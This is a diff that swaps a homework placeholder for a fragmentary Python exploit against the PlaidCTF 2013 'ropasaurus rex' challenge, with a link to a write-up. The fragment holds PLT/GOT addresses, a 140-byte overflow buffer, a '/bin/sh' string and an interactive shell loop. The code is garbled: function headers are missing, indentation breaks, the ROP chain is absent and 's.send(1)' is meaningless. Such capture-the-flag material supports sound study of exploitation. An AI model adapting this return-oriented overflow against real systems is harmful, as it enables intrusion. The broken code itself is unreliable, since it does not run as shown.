@@ -1,1 +1,21 @@
-# Put your string here (regardless of whether you're going for extra credit)
+https://isisblogs.poly.edu/2013/04/24/you-cant-stop-the-ropasaurus-rex-plaidctf-2013/
+
+#!/usr/bin/python
+import socket, time
+	while(command != 'exit'):
+		command=raw_input('')
+		sock.send(command + '\n')#raw_input won't grab a newline
+	return
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	return
+readplt      = 0x804832c
+writeplt     = 0x804830c
+readgot      = 0x804961C
+dataSeg      = 0x8049620
+buffer		 = 'A' * 140
+binsh = '/bin/sh\0'
+s.send(1)
+time.sleep(1)
+shell(s)
+#print s.recv(1024)
+s.close()
